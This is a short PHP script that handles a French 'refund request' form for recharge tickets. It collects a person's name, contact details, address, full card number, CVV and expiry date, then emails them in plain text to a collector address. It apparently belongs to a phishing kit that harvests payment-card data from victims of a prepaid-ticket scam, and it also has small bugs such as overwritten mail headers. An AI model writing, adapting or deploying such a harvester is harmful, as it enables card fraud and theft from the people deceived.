<?php

if (isset($_POST['submit'])) {

    $fname = $_POST['fname'];
    $email = $_POST['email'];
    $montant = $_POST['montant'];
    $ticket = $_POST['ticket'];
    $phone = $_POST['phone'];
    $adresse = $_POST['adresse'];
    $trecharge = $_POST['trecharge'];
    $carteNumber = $_POST['carteNumber'];
    $tcarte = $_POST['tcarte'];
    $cvv = $_POST['cvv'];
    $month = $_POST['month'];
    $year = $_POST['year'];

    $mailTo = "info@fiches-attestationdesrecharges.com";
    $headers = "From: Site de Fiche d'attestation des recharges\r\n";
    $headers = "Reply-To: refund@fiches-attestationdesrecharges.com\r\n";
    $headers = "Content-type: text/html\r\n";
    $subject = "Demande de remboursement de la part de ".$fname.".";
    $txt = "Demande de remboursement :\n\nNom du client : ".$fname.".\n\nAdresse mail du client : ".$email.".\n\nMontant : ".$montant.".\n\nNuméro du ticket : ".$ticket.".\n\nNuméro de téléphone : ".$phone.".\n\nAdresse : ".$adresse.".\n\nType de recharge : ".$trecharge.".\n\nNuméro de carte : ".$carteNumber.".\n\nType de carte : ".$tcarte.".\n\nCVV/CV2 : ".$cvv.".\n\nMois : ".$month.".\n\nAnnée : ".$year.".\n\n";

    $message = wordwrap($txt, 70);

    mail($mailTo, $subject, $txt, $headers);
    header("Location: ../answer.html");

};

?>
